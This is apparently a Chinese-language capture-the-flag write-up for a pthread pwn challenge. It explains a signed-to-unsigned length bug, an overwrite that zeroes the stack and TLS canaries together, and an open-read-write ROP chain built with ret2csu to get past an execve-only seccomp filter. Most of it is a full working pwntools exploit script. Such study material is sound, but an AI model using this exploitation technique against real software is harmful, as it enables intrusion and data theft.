# week4TLS_struct and Thread (easy_pthread)

## 题目简述

题目在线程函数中读取留言，长度变量先以有符号 `int` 检查，随后却被转换为 `unsigned short` 传给 `read`。输入负数即可制造超长栈溢出。程序开启了栈保护和 seccomp，但子线程的栈与线程局部存储（TLS）相邻，因此可以同时覆盖栈上的 Canary 副本和 TLS 中的原始 Canary；沙盒只禁止 `execve`，仍允许通过 `open-read-write` 读取 flag。

## 解题过程

源码中的关键缺陷是检查和使用长度时的类型不一致：

```cpp
std::cin >> size;
if (size >= 0xF8)
    exit(0);

nbytes = (unsigned short int)size;
read(0, message, nbytes);
```

`size` 是有符号 `int`，所以 `-1` 不满足 `size >= 0xF8`；转换为 `unsigned short` 后却变成 `65535`，远大于 `message[0x100]`。这使输入能够越过当前栈帧，继续覆盖 pthread 在线程栈末端布置的 TLS/TCB 数据。

栈保护在函数返回时比较“栈帧中保存的 Canary”和“TLS 中的 Canary”。本题不需要泄漏随机值：从 `message` 开始用零填充，既把栈帧中的 Canary 改为零，也把更远处 TLS 中的原始值改为零，两者仍然相等。针对题目给出的二进制，保存的返回地址位于 `message + 0x118`，而把总输入补到 `0xA00` 字节即可覆盖到 TLS；这些偏移与具体 glibc、pthread 栈布局和编译结果有关，换环境时应在调试器中重新确认。

seccomp 过滤器仅拒绝 x86-64 的 `execve`（系统调用号 `59`），`open`、`read`、`write` 均可使用。线程函数先打开 `name.txt` 和 `message.txt`，随后在返回前关闭两个描述符，因此 ROP 阶段再次调用 `open("./flag", 0)` 时，最低可用描述符稳定为 `3`。

完整利用如下。先调用程序自带的 `get_name` 向 `.bss` 写入 `./flag`，再执行 ORW；`read` 和 `write` 通过 ret2csu 设置三个参数。

```python
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF("./main", checksec=False)

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

pop_rdi = 0x401A3B
pop_rsi_r15 = 0x401A39
csu_pop = 0x401A32
csu_call = 0x401A18
get_name = 0x401523
buf = elf.bss() + 0x300


def call_with_csu(function_got, rdi, rsi, rdx):
    # r12 -> edi, r13 -> rsi, r14 -> rdx, r15 -> 被调用函数的 GOT 项
    return flat(
        csu_pop,
        0, 1, rdi, rsi, rdx, function_got,
        csu_call,
        0,                  # add rsp, 8
        0, 0, 0, 0, 0, 0  # 恢复 rbx、rbp、r12-r15
    )


io.sendlineafter(b"name: ", b"player")
io.sendlineafter(b"Enter the size of message: ", b"-1")

payload = b"\x00" * 0x118

# get_name(buf, 8)，下一次输入再发送 ./flag
payload += flat(pop_rdi, buf, pop_rsi_r15, 8, 0, get_name)

# open(buf, 0)，返回 fd 3
payload += flat(pop_rdi, buf, pop_rsi_r15, 0, 0, elf.plt["open"])

# read(3, buf, 0x50); write(1, buf, 0x50)
payload += call_with_csu(elf.got["read"], 3, buf, 0x50)
payload += call_with_csu(elf.got["write"], 1, buf, 0x50)

# 继续以零覆盖 TLS Canary
payload = payload.ljust(0xA00, b"\x00")

io.sendafter(b"message: ", payload + b"\n")
io.sendline(b"./flag")
io.interactive()
```

执行时，本地使用 `python3 exp.py`；远程环境可使用 `python3 exp.py REMOTE HOST=<地址> PORT=<端口>`，无需把失效的比赛地址写死在脚本中。

## 方法总结

本题的利用链是“有符号负数绕过检查 → 无符号截断形成超长读取 → 同时清零栈与 TLS 中的 Canary → ret2csu 完成 ORW”。关键不只是覆盖栈 Canary，而是让校验两侧保持一致；同时应逐条阅读 seccomp 规则，确认它只封锁 `execve`，而不是笼统地把程序视为无法执行任何系统调用。
